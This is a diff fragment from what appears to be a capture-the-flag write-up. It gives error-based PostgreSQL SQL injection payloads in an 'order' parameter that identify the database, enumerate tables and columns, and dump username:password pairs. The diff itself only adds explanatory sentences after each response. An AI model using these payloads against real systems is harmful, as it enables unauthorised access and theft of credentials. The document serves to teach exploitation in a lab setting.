@@ -28,25 +28,25 @@ A series of queries were executed to exploit the vulnerability:
 
     Database Identification:
     ?action=contents&order=ASC, (select cast(current_database() as int))
-    Response: c_webserveur_34
+    Response: c_webserveur_34    With the help of this load, we found out the name of the database.
 
 
 
     Table Enumeration:
     ?action=contents&order=ASC, (select cast(string_agg(table_name, $$ , $$) as int) from information_schema.tables where table_schema=$$public$$)
-    Response: 35t4bl3
+    Response: 35t4bl3     With the help of this load, you can find out the name of the table.
 
 
 
     Column Enumeration:
     ?action=contents&order=ASC, (select cast(string_agg(column_name, $$ , $$) as int) from information_schema.columns where table_name = $$35t4bl3$$)
-    Response: id , n4m3_ , p455w0rd_ , em41l_
+    Response: id , n4m3_ , p455w0rd_ , em41l_      With the help of this load, you can find out the names of the columns in the table.
 
 
 
     Data Exfiltration:
     ?action=contents&order=ASC, (select cast(string_agg(n4m3_ || $$:$$ || p455w0rd_, $$ | $$) as int) from 35t4bl3)
-    Response: admin:1a2BdKT
+    Response: admin:1a2BdKT     And finally, we will find out what is written in the database.
 
 
 
